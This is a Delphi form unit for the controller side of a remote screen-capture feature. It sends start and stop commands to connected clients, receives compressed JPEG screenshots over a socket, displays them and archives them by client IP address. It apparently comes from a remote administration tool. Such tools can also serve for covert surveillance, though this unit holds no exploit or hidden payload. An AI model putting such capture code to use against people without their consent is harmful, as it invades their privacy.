unit UnitScreen;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, Spin, ComCtrls, ExtCtrls, UnitConnection, UnitUtils, UnitCommands,
  ZLibEx, jpeg;

type
  TFormScreen = class(TForm)
    stat1: TStatusBar;
    pb1: TProgressBar;
    pnl1: TPanel;
    img1: TImage;
    btn1: TButton;
    trckbrQuality: TTrackBar;
    lbl1: TLabel;
    lbl2: TLabel;
    seInterval: TSpinEdit;
    chk1: TCheckBox;
    lbl3: TLabel;
    procedure btn1Click(Sender: TObject);
    procedure trckbrQualityChange(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
  protected
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
    ClientDatas: TClientDatas;                              
    procedure OnClientRead(Datas: string);
    procedure OnStreamTransfer(Sender: TObject; Transfered: Integer);
  public
    { Public declarations }
    constructor Create(aOwner: TComponent; _ClientDatas: TClientDatas);
    procedure WndProc(var Msg: TMessage); override;
  end;

var
  FormScreen: TFormScreen;

implementation

{$R *.dfm}
     
constructor TFormScreen.Create(aOwner: TComponent; _ClientDatas: TClientDatas);
begin
  inherited Create(aOwner);
  ClientDatas := _ClientDatas;
end;

procedure TFormScreen.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;

procedure TFormScreen.WndProc(var Msg: TMessage);
begin
  inherited;
  if Msg.Msg = WM_USER + 12 then OnClientRead(string(Msg.WParam));
end;

procedure TFormScreen.OnStreamTransfer(Sender: TObject; Transfered: Integer);
begin
  pb1.Position := pb1.Position + Transfered;
end;

procedure TFormScreen.OnClientRead(Datas: string);
var
  Cmd: Integer;
  Jpg: TJPEGImage;
  Bmp: TBitmap;
  TmpStr: string;
  Stream, TmpStream: TMemoryStream;
begin
  Cmd := StrToInt(Copy(Datas, 1, Pos('|', Datas) - 1));
  Delete(Datas, 1, Pos('|', Datas));

  case Cmd of
    CMD_SCREEN_CAPTURE:
    begin
      pb1.Position := 0;
      pb1.Max := StrToInt(Datas);

      Stream := ClientDatas.ClientSocket.RecvStream(StrToInt(Datas), OnStreamTransfer);
      Stream.Position := 0;

      if Stream = nil then Exit;

      //decompress received stream
      TmpStream := TMemoryStream.Create;
      ZDecompressStream(Stream, TmpStream);   
      TmpStream.Position := 0;
      Stream.Free;

      Jpg := TJPEGImage.Create;
      Jpg.LoadFromStream(TmpStream);
      TmpStream.Free;
      Bmp := TBitmap.Create;
      Bmp.Assign(Jpg);
      Jpg.Free;

      if chk1.Checked then
      begin
        //create screen capture's folder first
        if not DirectoryExists(ExtractFilePath(ParamStr(0)) + 'Screen capture') then
          CreateDir(ExtractFilePath(ParamStr(0)) + 'Screen capture');

        //and then for the specific client
        TmpStr := ExtractFilePath(ParamStr(0)) + 'Screen capture\' + ClientDatas.ClientSocket.RemoteAddress;
        if not DirectoryExists(TmpStr) then CreateDir(TmpStr);

        //save image to file with unique id
        Bmp.SaveToFile(TmpStr + '\' + IntToStr(GetTickCount));
      end;

      img1.Picture.Bitmap.Assign(bmp);
      Bmp.Free;
      
      Application.ProcessMessages;
    end;

    CMD_SCREEN_START:
    begin                                                  
      btn1.Caption := 'Stop';    
      trckbrQuality.Enabled := False;
      seInterval.Enabled := False;
      stat1.Panels.Items[0].Text := 'Screen capture started successfully!';
    end;

    CMD_SCREEN_STOP:
    begin
      btn1.Caption := 'Start';
      trckbrQuality.Enabled := True;
      seInterval.Enabled := True;
      stat1.Panels.Items[0].Text := 'Screen capture stopped.';
    end;
  end;
end;
       
procedure TFormScreen.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  if btn1.Caption = 'Stop' then
    ClientDatas.SendDatas(IntToStr(CMD_SCREEN_STOP) + '|'); //stop capture when closing form
end;

procedure TFormScreen.FormCreate(Sender: TObject);
begin
  //
end;

procedure TFormScreen.FormShow(Sender: TObject);
begin
  //center window
  Left := (Screen.Width - Width) div 2;
  Top := (Screen.Height - Height) div 2;
end;

procedure TFormScreen.btn1Click(Sender: TObject);
begin
  if btn1.Caption = 'Start' then
  begin
    ClientDatas.SendDatas(IntToStr(CMD_SCREEN_START) + '|' +
      IntToStr(trckbrQuality.Position) + '|' + IntToStr(img1.Width) + '|' + 
      IntToStr(img1.Height) + '|' + seInterval.Text + '|');
  end
  else ClientDatas.SendDatas(IntToStr(CMD_SCREEN_STOP) + '|');

  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;

procedure TFormScreen.trckbrQualityChange(Sender: TObject);
begin
  lbl3.Caption := IntToStr(trckbrQuality.Position) + ' %';
end;

end.
